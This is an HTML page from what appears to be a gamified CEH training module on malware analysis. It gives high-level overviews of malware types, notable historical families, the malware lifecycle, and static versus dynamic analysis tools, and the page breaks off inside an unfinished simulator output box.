<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Malware Analysis Lab - Hexworth Prime Dark Arts Vault</title>
  <style>
    :root {
      --primary: #a855f7;
      --accent: #dc2626;
      --bg: #0a0a0f;
      --surface: #1a1a2e;
      --surface-light: #25254a;
      --text: #e0e0e0;
      --text-dim: #a0a0a0;
      --success: #10b981;
      --warning: #f59e0b;
      --border: #333355;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, var(--bg) 0%, #1a0a1f 100%);
      color: var(--text);
      line-height: 1.6;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 1400px;
      margin: 0 auto;
    }

    header {
      background: linear-gradient(135deg, var(--surface) 0%, var(--surface-light) 100%);
      border: 2px solid var(--primary);
      border-radius: 12px;
      padding: 25px;
      margin-bottom: 30px;
      box-shadow: 0 10px 30px rgba(168, 85, 247, 0.2);
    }

    .header-content {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 20px;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .skull-icon {
      font-size: 2.5em;
      filter: drop-shadow(0 0 10px var(--primary));
    }

    h1 {
      font-size: 2.2em;
      background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .subtitle {
      color: var(--text-dim);
      font-size: 0.95em;
      margin-top: 5px;
    }

    .header-actions {
      display: flex;
      gap: 15px;
      align-items: center;
    }

    .xp-badge {
      background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
      padding: 10px 20px;
      border-radius: 25px;
      font-weight: bold;
      display: flex;
      align-items: center;
      gap: 8px;
      box-shadow: 0 4px 15px rgba(168, 85, 247, 0.4);
    }

    .btn {
      background: var(--surface);
      color: var(--text);
      border: 2px solid var(--primary);
      padding: 10px 20px;
      border-radius: 8px;
      text-decoration: none;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: bold;
    }

    .btn:hover {
      background: var(--primary);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(168, 85, 247, 0.4);
    }

    .progress-container {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 30px;
    }

    .progress-bar {
      background: var(--surface-light);
      height: 30px;
      border-radius: 15px;
      overflow: hidden;
      position: relative;
    }

    .progress-fill {
      background: linear-gradient(90deg, var(--primary) 0%, var(--accent) 100%);
      height: 100%;
      transition: width 0.5s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 0.9em;
    }

    .tabs {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      background: var(--surface);
      padding: 10px;
      border-radius: 12px;
      border: 1px solid var(--border);
    }

    .tab {
      padding: 12px 24px;
      background: var(--surface-light);
      border: 2px solid var(--border);
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 600;
    }

    .tab:hover {
      border-color: var(--primary);
      transform: translateY(-2px);
    }

    .tab.active {
      background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
      border-color: var(--primary);
      box-shadow: 0 4px 15px rgba(168, 85, 247, 0.4);
    }

    .tab-content {
      display: none;
      animation: fadeIn 0.5s ease;
    }

    .tab-content.active {
      display: block;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .section {
      background: var(--surface);
      border: 2px solid var(--border);
      border-radius: 12px;
      padding: 25px;
      margin-bottom: 25px;
    }

    .section h2 {
      color: var(--primary);
      margin-bottom: 20px;
      font-size: 1.8em;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .section h3 {
      color: var(--accent);
      margin-top: 20px;
      margin-bottom: 15px;
      font-size: 1.3em;
    }

    .threat-level {
      display: inline-block;
      padding: 5px 15px;
      border-radius: 20px;
      font-size: 0.85em;
      font-weight: bold;
      text-transform: uppercase;
    }

    .threat-low { background: #10b981; color: #000; }
    .threat-medium { background: #f59e0b; color: #000; }
    .threat-high { background: #ef4444; color: #fff; }
    .threat-critical { background: #dc2626; color: #fff; animation: pulse 2s infinite; }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }

    .malware-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }

    .malware-card {
      background: var(--surface-light);
      border: 2px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      transition: all 0.3s ease;
      cursor: pointer;
    }

    .malware-card:hover {
      border-color: var(--primary);
      transform: translateY(-5px);
      box-shadow: 0 8px 25px rgba(168, 85, 247, 0.3);
    }

    .malware-card h4 {
      color: var(--primary);
      margin-bottom: 10px;
      font-size: 1.2em;
    }

    .malware-card .description {
      color: var(--text-dim);
      font-size: 0.95em;
      margin-bottom: 15px;
    }

    .behaviors {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin-top: 15px;
    }

    .behavior-tag {
      background: var(--bg);
      color: var(--primary);
      padding: 5px 12px;
      border-radius: 15px;
      font-size: 0.85em;
      border: 1px solid var(--primary);
    }

    .analysis-simulator {
      background: var(--bg);
      border: 2px solid var(--primary);
      border-radius: 10px;
      padding: 25px;
      margin-top: 20px;
    }

    .sample-selector {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
      margin-bottom: 20px;
    }

    .sample-btn {
      background: var(--surface-light);
      border: 2px solid var(--border);
      padding: 15px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      text-align: center;
    }

    .sample-btn:hover {
      border-color: var(--primary);
      background: var(--surface);
    }

    .sample-btn.selected {
      border-color: var(--accent);
      background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
    }

    .analysis-output {
      background: #000;
      border: 2px solid var(--primary);
      border-radius: 8px;
      padding: 20px;
      font-family: 'Courier New', monospace;
      color: #00ff00;
      min-height: 300px;
      overflow-y: auto;
      max-height: 500px;
    }

    .analysis-line {
      margin-bottom: 8px;
      animation: typeLine 0.5s ease;
    }

    @keyframes typeLine {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .timeline {
      position: relative;
      padding: 20px 0;
    }

    .timeline-item {
      display: flex;
      gap: 20px;
      margin-bottom: 30px;
      position: relative;
    }

    .timeline-item::before {
      content: '';
      position: absolute;
      left: 80px;
      top: 30px;
      width: 2px;
      height: calc(100% + 30px);
      background: var(--border);
    }

    .timeline-item:last-child::before {
      display: none;
    }

    .timeline-year {
      width: 80px;
      font-weight: bold;
      color: var(--primary);
      flex-shrink: 0;
    }

    .timeline-marker {
      width: 20px;
      height: 20px;
      background: var(--accent);
      border-radius: 50%;
      flex-shrink: 0;
      margin-top: 5px;
      box-shadow: 0 0 10px var(--accent);
    }

    .timeline-content {
      flex: 1;
      background: var(--surface-light);
      padding: 15px;
      border-radius: 8px;
      border: 1px solid var(--border);
    }

    .ioc-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 15px;
      margin-top: 20px;
    }

    .ioc-card {
      background: var(--surface-light);
      border-left: 4px solid var(--accent);
      padding: 15px;
      border-radius: 6px;
    }

    .ioc-card h4 {
      color: var(--accent);
      margin-bottom: 10px;
      font-size: 1.1em;
    }

    .ioc-card code {
      background: var(--bg);
      padding: 3px 8px;
      border-radius: 4px;
      color: var(--primary);
      font-size: 0.9em;
    }

    .family-tree {
      background: var(--bg);
      border: 2px solid var(--border);
      border-radius: 10px;
      padding: 30px;
      margin-top: 20px;
      overflow-x: auto;
    }

    .tree-node {
      background: var(--surface-light);
      border: 2px solid var(--primary);
      padding: 12px 20px;
      border-radius: 8px;
      display: inline-block;
      margin: 10px;
      position: relative;
    }

    .tree-node::before {
      content: '';
      position: absolute;
      top: -20px;
      left: 50%;
      width: 2px;
      height: 20px;
      background: var(--border);
    }

    .tree-children {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 30px;
      flex-wrap: wrap;
    }

    .quiz-container {
      background: var(--surface);
      border: 2px solid var(--border);
      border-radius: 12px;
      padding: 25px;
      margin-top: 20px;
    }

    .question {
      background: var(--surface-light);
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
      border: 2px solid var(--border);
    }

    .question h4 {
      color: var(--primary);
      margin-bottom: 15px;
      font-size: 1.1em;
    }

    .options {
      display: grid;
      gap: 10px;
    }

    .option {
      background: var(--bg);
      border: 2px solid var(--border);
      padding: 12px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .option:hover {
      border-color: var(--primary);
      background: var(--surface);
    }

    .option.selected {
      border-color: var(--primary);
      background: var(--surface);
    }

    .option.correct {
      border-color: var(--success);
      background: rgba(16, 185, 129, 0.2);
    }

    .option.incorrect {
      border-color: var(--accent);
      background: rgba(220, 38, 38, 0.2);
    }

    .quiz-nav {
      display: flex;
      justify-content: space-between;
      margin-top: 20px;
      gap: 15px;
    }

    .quiz-result {
      background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
      padding: 30px;
      border-radius: 12px;
      text-align: center;
      margin-top: 20px;
    }

    .quiz-result h3 {
      font-size: 2em;
      margin-bottom: 15px;
      color: #fff;
    }

    .quiz-result .score {
      font-size: 3em;
      font-weight: bold;
      margin: 20px 0;
    }

    .info-box {
      background: var(--surface-light);
      border-left: 4px solid var(--primary);
      padding: 15px;
      margin: 15px 0;
      border-radius: 4px;
    }

    .warning-box {
      background: rgba(245, 158, 11, 0.1);
      border-left: 4px solid var(--warning);
      padding: 15px;
      margin: 15px 0;
      border-radius: 4px;
    }

    .danger-box {
      background: rgba(220, 38, 38, 0.1);
      border-left: 4px solid var(--accent);
      padding: 15px;
      margin: 15px 0;
      border-radius: 4px;
    }

    ul, ol {
      margin-left: 25px;
      margin-top: 10px;
    }

    li {
      margin-bottom: 8px;
    }

    code {
      background: var(--bg);
      padding: 2px 6px;
      border-radius: 4px;
      color: var(--primary);
      font-family: 'Courier New', monospace;
    }

    .btn-group {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      margin-top: 20px;
    }

    .btn-primary {
      background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
      border: none;
    }

    .btn-secondary {
      background: var(--surface-light);
      border: 2px solid var(--border);
    }

    @media (max-width: 768px) {
      h1 { font-size: 1.6em; }
      .header-content { flex-direction: column; align-items: flex-start; }
      .malware-grid { grid-template-columns: 1fr; }
      .tabs { flex-direction: column; }
      .tab { width: 100%; }
    }

    .loading-spinner {
      border: 3px solid var(--border);
      border-top: 3px solid var(--primary);
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .comparison-table {
      width: 100%;
      border-collapse: collapse;
      margin: 20px 0;
    }

    .comparison-table th,
    .comparison-table td {
      border: 1px solid var(--border);
      padding: 12px;
      text-align: left;
    }

    .comparison-table th {
      background: var(--surface-light);
      color: var(--primary);
      font-weight: bold;
    }

    .comparison-table tr:hover {
      background: var(--surface-light);
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="header-content">
        <div class="brand">
          <div class="skull-icon">‚ò†Ô∏è</div>
          <div>
            <h1>Malware Analysis Lab</h1>
            <div class="subtitle">Dark Arts Vault - CEH v12 Comprehensive Training</div>
          </div>
        </div>
        <div class="header-actions">
          <div class="xp-badge">
            <span>‚≠ê</span>
            <span>75 XP Available</span>
          </div>
          <a href="../index.html" class="btn">‚Üê Back to Vault</a>
        </div>
      </div>
    </header>

    <div class="progress-container">
      <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
        <strong>Module Progress</strong>
        <span id="progress-text">0% Complete</span>
      </div>
      <div class="progress-bar">
        <div class="progress-fill" id="progress-fill" style="width: 0%">
          <span id="progress-percent">0%</span>
        </div>
      </div>
    </div>

    <div class="tabs">
      <div class="tab active" data-tab="overview">üìã Overview</div>
      <div class="tab" data-tab="types">ü¶† Malware Types</div>
      <div class="tab" data-tab="zoo">üß™ Malware Zoo</div>
      <div class="tab" data-tab="analysis">üî¨ Analysis Lab</div>
      <div class="tab" data-tab="apt">üéØ APT & Advanced Threats</div>
      <div class="tab" data-tab="components">‚öôÔ∏è Components</div>
      <div class="tab" data-tab="evasion">ü•∑ Evasion Techniques</div>
      <div class="tab" data-tab="timeline">üìÖ History</div>
      <div class="tab" data-tab="ioc">üîç IOCs</div>
      <div class="tab" data-tab="quiz">üéì Quiz</div>
    </div>

    <!-- Overview Tab -->
    <div class="tab-content active" id="overview">
      <div class="section">
        <h2>ü¶† Malware Fundamentals</h2>
        <p>Malware (malicious software) is an umbrella term encompassing any software intentionally designed to cause damage to computers, servers, clients, or computer networks. Understanding malware is essential for cybersecurity professionals to protect systems and conduct forensic investigations.</p>

        <div class="info-box">
          <h3>Core Malware Categories</h3>
          <ul>
            <li><strong>Trojans:</strong> Disguised malware that appears legitimate but performs malicious actions</li>
            <li><strong>Viruses:</strong> Self-replicating code that requires user action to spread</li>
            <li><strong>Worms:</strong> Self-propagating malware that spreads without user interaction</li>
            <li><strong>Ransomware:</strong> Encrypts victim files and demands payment for decryption</li>
            <li><strong>Adware:</strong> Displays unwanted advertisements, often bundled with legitimate software</li>
            <li><strong>Spyware:</strong> Covertly gathers user information without consent</li>
            <li><strong>Rootkits:</strong> Provides privileged access while hiding its presence</li>
            <li><strong>Fileless Malware:</strong> Operates in memory without traditional files</li>
          </ul>
        </div>

        <h3>Malware Lifecycle</h3>
        <ol>
          <li><strong>Delivery:</strong> Email attachments, drive-by downloads, USB drives, social engineering</li>
          <li><strong>Execution:</strong> Exploiting vulnerabilities, user interaction, auto-execution</li>
          <li><strong>Persistence:</strong> Registry modification, scheduled tasks, service installation</li>
          <li><strong>Privilege Escalation:</strong> Exploiting system vulnerabilities for higher access</li>
          <li><strong>Command & Control (C2):</strong> Establishing communication with attacker servers</li>
          <li><strong>Objective Execution:</strong> Data theft, encryption, lateral movement, destruction</li>
        </ol>

        <div class="warning-box">
          <strong>‚ö†Ô∏è Legal Warning</strong>
          <p>The techniques and tools discussed in this module are for educational and defensive purposes only. Unauthorized deployment of malware or conducting malware analysis on systems you don't own is illegal and unethical.</p>
        </div>
      </div>

      <div class="section">
        <h2>üéØ Learning Objectives</h2>
        <div class="malware-grid">
          <div class="malware-card">
            <h4>üîç Identification</h4>
            <p class="description">Learn to identify different malware types based on behavior patterns and characteristics.</p>
          </div>
          <div class="malware-card">
            <h4>üî¨ Analysis Techniques</h4>
            <p class="description">Master static and dynamic analysis methodologies for malware examination.</p>
          </div>
          <div class="malware-card">
            <h4>üõ°Ô∏è Defense Strategies</h4>
            <p class="description">Understand prevention, detection, and mitigation strategies.</p>
          </div>
          <div class="malware-card">
            <h4>üìä Threat Intelligence</h4>
            <p class="description">Utilize IOCs and threat intelligence for proactive defense.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- Malware Types Tab -->
    <div class="tab-content" id="types">
      <div class="section">
        <h2>ü¶† Comprehensive Malware Classification</h2>

        <h3>Trojans <span class="threat-level threat-high">High Threat</span></h3>
        <p>Trojans are malicious programs disguised as legitimate software. Unlike viruses, they do not self-replicate but rely on social engineering to trick users into execution.</p>
        <div class="info-box">
          <h4>Trojan Subcategories:</h4>
          <ul>
            <li><strong>Backdoor Trojans:</strong> Provide remote access to compromised systems (e.g., NetBus, SubSeven)</li>
            <li><strong>RATs (Remote Access Trojans):</strong> Full remote control with keylogging, screen capture, file transfer (e.g., DarkComet, NanoCore)</li>
            <li><strong>Banking Trojans:</strong> Steal financial credentials (e.g., Zeus, Emotet, TrickBot)</li>
            <li><strong>Downloader Trojans:</strong> Download and install additional malware</li>
            <li><strong>DDoS Trojans:</strong> Recruit systems into botnets for distributed attacks</li>
            <li><strong>Proxy Trojans:</strong> Use victim's system as proxy for anonymous activities</li>
          </ul>
        </div>

        <h3>Viruses <span class="threat-level threat-high">High Threat</span></h3>
        <p>Self-replicating malware that attaches itself to clean files and spreads when the infected file is executed. Requires user action to propagate.</p>
        <div class="info-box">
          <h4>Virus Types:</h4>
          <ul>
            <li><strong>File Infector:</strong> Attaches to executable files (.exe, .com)</li>
            <li><strong>Macro Virus:</strong> Embedded in documents (Word, Excel macros)</li>
            <li><strong>Boot Sector Virus:</strong> Infects master boot record</li>
            <li><strong>Polymorphic Virus:</strong> Changes code signature to evade detection</li>
            <li><strong>Metamorphic Virus:</strong> Completely rewrites itself with each infection</li>
            <li><strong>Stealth Virus:</strong> Hides modifications and intercepts antivirus queries</li>
          </ul>
        </div>

        <h3>Worms <span class="threat-level threat-critical">Critical Threat</span></h3>
        <p>Self-propagating malware that spreads across networks without user interaction. Can cause massive damage by consuming bandwidth and system resources.</p>
        <div class="danger-box">
          <h4>Notable Characteristics:</h4>
          <ul>
            <li>Exploits network vulnerabilities and security flaws</li>
            <li>Spreads rapidly across interconnected systems</li>
            <li>Often carries additional payloads (ransomware, backdoors)</li>
            <li>Examples: WannaCry, NotPetya, Conficker, Blaster</li>
          </ul>
        </div>

        <h3>Ransomware <span class="threat-level threat-critical">Critical Threat</span></h3>
        <p>Encrypts victim's files and demands ransom payment (usually cryptocurrency) for decryption key.</p>
        <div class="info-box">
          <h4>Ransomware Evolution:</h4>
          <ul>
            <li><strong>Crypto-Ransomware:</strong> Encrypts files (CryptoLocker, Ryuk, REvil)</li>
            <li><strong>Locker Ransomware:</strong> Locks users out of systems</li>
            <li><strong>Double Extortion:</strong> Encrypts AND exfiltrates data, threatens public release</li>
            <li><strong>Ransomware-as-a-Service (RaaS):</strong> Ransomware operations offered to affiliates</li>
          </ul>
        </div>

        <h3>Spyware & Adware <span class="threat-level threat-medium">Medium Threat</span></h3>
        <div class="malware-grid">
          <div class="malware-card">
            <h4>Spyware</h4>
            <p class="description">Covertly monitors user activity, stealing passwords, browsing history, and sensitive data.</p>
            <div class="behaviors">
              <span class="behavior-tag">Keylogging</span>
              <span class="behavior-tag">Screen Capture</span>
              <span class="behavior-tag">Data Exfiltration</span>
            </div>
          </div>
          <div class="malware-card">
            <h4>Adware</h4>
            <p class="description">Displays unwanted advertisements, redirects searches, and tracks browsing behavior for revenue generation.</p>
            <div class="behaviors">
              <span class="behavior-tag">Pop-ups</span>
              <span class="behavior-tag">Browser Hijacking</span>
              <span class="behavior-tag">Tracking</span>
            </div>
          </div>
        </div>

        <h3>Fileless Malware <span class="threat-level threat-critical">Critical Threat</span></h3>
        <p>Memory-resident malware that operates without traditional executable files, making detection extremely difficult.</p>
        <div class="danger-box">
          <h4>Characteristics:</h4>
          <ul>
            <li><strong>Living-off-the-Land (LotL):</strong> Uses legitimate system tools (PowerShell, WMI, PsExec)</li>
            <li><strong>Memory-only execution:</strong> Never touches disk in traditional form</li>
            <li><strong>Registry abuse:</strong> Stores malicious code in registry keys</li>
            <li><strong>Script-based attacks:</strong> JavaScript, VBScript, PowerShell exploitation</li>
            <li><strong>Examples:</strong> PowerGhost, Astaroth, Operation Cobalt Kitty</li>
          </ul>
        </div>

        <table class="comparison-table">
          <thead>
            <tr>
              <th>Malware Type</th>
              <th>Self-Replicating</th>
              <th>User Action Required</th>
              <th>Primary Objective</th>
              <th>Threat Level</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Virus</td>
              <td>Yes</td>
              <td>Yes</td>
              <td>Spread & Damage</td>
              <td><span class="threat-level threat-high">High</span></td>
            </tr>
            <tr>
              <td>Worm</td>
              <td>Yes</td>
              <td>No</td>
              <td>Rapid Propagation</td>
              <td><span class="threat-level threat-critical">Critical</span></td>
            </tr>
            <tr>
              <td>Trojan</td>
              <td>No</td>
              <td>Yes</td>
              <td>Remote Access/Theft</td>
              <td><span class="threat-level threat-high">High</span></td>
            </tr>
            <tr>
              <td>Ransomware</td>
              <td>No</td>
              <td>Varies</td>
              <td>Financial Extortion</td>
              <td><span class="threat-level threat-critical">Critical</span></td>
            </tr>
            <tr>
              <td>Spyware</td>
              <td>No</td>
              <td>Yes</td>
              <td>Data Theft</td>
              <td><span class="threat-level threat-medium">Medium</span></td>
            </tr>
            <tr>
              <td>Fileless</td>
              <td>Varies</td>
              <td>Varies</td>
              <td>Stealth Operations</td>
              <td><span class="threat-level threat-critical">Critical</span></td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- Malware Zoo Tab -->
    <div class="tab-content" id="zoo">
      <div class="section">
        <h2>üß™ The Malware Zoo - Specimen Collection</h2>
        <p>Interactive collection of notable malware specimens. Click each card to learn behavioral patterns and detection signatures.</p>

        <div class="malware-grid" id="zoo-grid">
          <div class="malware-card" data-specimen="wannacry">
            <h4>WannaCry <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Ransomware worm that exploited EternalBlue (SMBv1) vulnerability. Infected 230,000+ computers in 150 countries in May 2017.</p>
            <div class="behaviors">
              <span class="behavior-tag">SMB Exploitation</span>
              <span class="behavior-tag">File Encryption</span>
              <span class="behavior-tag">Network Propagation</span>
              <span class="behavior-tag">Bitcoin Ransom</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="emotet">
            <h4>Emotet <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Modular banking Trojan turned malware-as-a-service platform. Polymorphic with sophisticated evasion techniques.</p>
            <div class="behaviors">
              <span class="behavior-tag">Email Phishing</span>
              <span class="behavior-tag">Credential Theft</span>
              <span class="behavior-tag">Lateral Movement</span>
              <span class="behavior-tag">Modular Payloads</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="stuxnet">
            <h4>Stuxnet <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Nation-state worm targeting SCADA systems. First known cyber weapon designed to cause physical damage to industrial infrastructure.</p>
            <div class="behaviors">
              <span class="behavior-tag">SCADA Targeting</span>
              <span class="behavior-tag">Zero-day Exploits</span>
              <span class="behavior-tag">Rootkit</span>
              <span class="behavior-tag">PLC Manipulation</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="darkcomet">
            <h4>DarkComet RAT <span class="threat-level threat-high">High</span></h4>
            <p class="description">Remote Access Trojan with keylogging, webcam access, file management, and password recovery capabilities.</p>
            <div class="behaviors">
              <span class="behavior-tag">Remote Desktop</span>
              <span class="behavior-tag">Keylogging</span>
              <span class="behavior-tag">Webcam Hijack</span>
              <span class="behavior-tag">Persistence</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="zeus">
            <h4>Zeus/Zbot <span class="threat-level threat-high">High</span></h4>
            <p class="description">Banking Trojan stealing credentials via form-grabbing and keystroke logging. Source code leaked in 2011, spawning numerous variants.</p>
            <div class="behaviors">
              <span class="behavior-tag">Form Grabbing</span>
              <span class="behavior-tag">Keylogging</span>
              <span class="behavior-tag">Man-in-the-Browser</span>
              <span class="behavior-tag">Botnet C2</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="powerghost">
            <h4>PowerGhost <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Fileless cryptomining malware using PowerShell and WMI. Spreads via EternalBlue and mimikatz credential theft.</p>
            <div class="behaviors">
              <span class="behavior-tag">Fileless</span>
              <span class="behavior-tag">PowerShell</span>
              <span class="behavior-tag">Cryptomining</span>
              <span class="behavior-tag">Credential Theft</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="ryuk">
            <h4>Ryuk <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Targeted ransomware used in big-game hunting attacks against enterprises. Manually deployed after network reconnaissance.</p>
            <div class="behaviors">
              <span class="behavior-tag">Targeted Deployment</span>
              <span class="behavior-tag">File Encryption</span>
              <span class="behavior-tag">Shadow Copy Deletion</span>
              <span class="behavior-tag">High Ransom</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="conficker">
            <h4>Conficker <span class="threat-level threat-high">High</span></h4>
            <p class="description">Computer worm exploiting Windows vulnerabilities. Created one of the largest botnets with 9-15 million infected computers.</p>
            <div class="behaviors">
              <span class="behavior-tag">MS08-067 Exploit</span>
              <span class="behavior-tag">USB Propagation</span>
              <span class="behavior-tag">Network Shares</span>
              <span class="behavior-tag">Botnet</span>
            </div>
          </div>

          <div class="malware-card" data-specimen="notpetya">
            <h4>NotPetya <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Destructive wiper malware disguised as ransomware. Caused $10+ billion in damages, targeting Ukrainian organizations primarily.</p>
            <div class="behaviors">
              <span class="behavior-tag">EternalBlue</span>
              <span class="behavior-tag">MBR Wiper</span>
              <span class="behavior-tag">Mimikatz</span>
              <span class="behavior-tag">Supply Chain</span>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Analysis Lab Tab -->
    <div class="tab-content" id="analysis">
      <div class="section">
        <h2>üî¨ Malware Analysis Methodologies</h2>

        <h3>Static Analysis vs Dynamic Analysis</h3>
        <table class="comparison-table">
          <thead>
            <tr>
              <th>Aspect</th>
              <th>Static Analysis</th>
              <th>Dynamic Analysis</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Definition</strong></td>
              <td>Examining malware without executing it</td>
              <td>Observing malware behavior during execution</td>
            </tr>
            <tr>
              <td><strong>Safety</strong></td>
              <td>Safe - no execution risk</td>
              <td>Requires isolated environment (sandbox)</td>
            </tr>
            <tr>
              <td><strong>Tools</strong></td>
              <td>Disassemblers (IDA, Ghidra), hex editors, strings, PE analyzers</td>
              <td>Sandboxes (Cuckoo, Any.run), debuggers (OllyDbg, x64dbg), process monitors</td>
            </tr>
            <tr>
              <td><strong>Information</strong></td>
              <td>Code structure, strings, imports, signatures</td>
              <td>Network connections, file operations, registry changes, API calls</td>
            </tr>
            <tr>
              <td><strong>Evasion</strong></td>
              <td>Defeated by obfuscation, packing, encryption</td>
              <td>Defeated by sandbox detection, time-based triggers</td>
            </tr>
            <tr>
              <td><strong>Time</strong></td>
              <td>Time-intensive for complex samples</td>
              <td>Faster initial triage</td>
            </tr>
          </tbody>
        </table>

        <h3>Static Analysis Workflow</h3>
        <ol>
          <li><strong>File Identification:</strong> File type, hash values (MD5, SHA256), size</li>
          <li><strong>String Extraction:</strong> Extract readable strings for URLs, IPs, commands, registry keys</li>
          <li><strong>PE Analysis:</strong> Examine headers, sections, imports, exports, resources</li>
          <li><strong>Signature Scanning:</strong> YARA rules, antivirus signatures, IOC matching</li>
          <li><strong>Disassembly:</strong> Reverse engineer assembly code to understand logic</li>
          <li><strong>Deobfuscation:</strong> Unpack or decrypt protected code sections</li>
        </ol>

        <h3>Dynamic Analysis Workflow</h3>
        <ol>
          <li><strong>Environment Preparation:</strong> Isolated VM with monitoring tools</li>
          <li><strong>Baseline Snapshot:</strong> Document clean system state</li>
          <li><strong>Execution Monitoring:</strong> Run malware with comprehensive logging</li>
          <li><strong>Behavioral Analysis:</strong> Observe processes, network, filesystem, registry</li>
          <li><strong>Memory Analysis:</strong> Dump and analyze process memory</li>
          <li><strong>Network Analysis:</strong> Capture traffic, identify C2 servers, protocols</li>
          <li><strong>Artifact Collection:</strong> Dropped files, created services, scheduled tasks</li>
        </ol>

        <div class="info-box">
          <h4>Essential Analysis Tools:</h4>
          <ul>
            <li><strong>Static:</strong> IDA Pro, Ghidra, PEStudio, PE Explorer, CFF Explorer, strings, YARA</li>
            <li><strong>Dynamic:</strong> Cuckoo Sandbox, Any.run, Process Hacker, Process Monitor, Wireshark, Fakenet-NG</li>
            <li><strong>Debuggers:</strong> OllyDbg, x64dbg, WinDbg, GDB</li>
            <li><strong>Memory:</strong> Volatility Framework, Rekall, WinDbg</li>
            <li><strong>Network:</strong> Wireshark, TCPDump, Fiddler, BurpSuite</li>
          </ul>
        </div>
      </div>

      <div class="analysis-simulator">
        <h3>üß™ Interactive Analysis Simulator</h3>
        <p>Select a malware sample to perform simulated analysis. This demonstrates the analysis workflow without executing real malware.</p>

        <div class="sample-selector" id="sample-selector">
          <div class="sample-btn" data-sample="banker">
            <div>üè¶ Banking Trojan</div>
            <div style="font-size: 0.85em; color: var(--text-dim); margin-top: 5px;">Credential Stealer</div>
          </div>
          <div class="sample-btn" data-sample="ransomware">
            <div>üîê Ransomware</div>
            <div style="font-size: 0.85em; color: var(--text-dim); margin-top: 5px;">File Encryptor</div>
          </div>
          <div class="sample-btn" data-sample="fileless">
            <div>üëª Fileless Malware</div>
            <div style="font-size: 0.85em; color: var(--text-dim); margin-top: 5px;">Memory-Resident</div>
          </div>
          <div class="sample-btn" data-sample="rat">
            <div>üéÆ RAT</div>
            <div style="font-size: 0.85em; color: var(--text-dim); margin-top: 5px;">Remote Access Tool</div>
          </div>
        </div>

        <div class="btn-group">
          <button class="btn btn-primary" id="start-static">Run Static Analysis</button>
          <button class="btn btn-primary" id="start-dynamic">Run Dynamic Analysis</button>
          <button class="btn btn-secondary" id="clear-analysis">Clear Output</button>
        </div>

        <div class="analysis-output" id="analysis-output">
          <div style="color: #00ff00;">‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó</div>
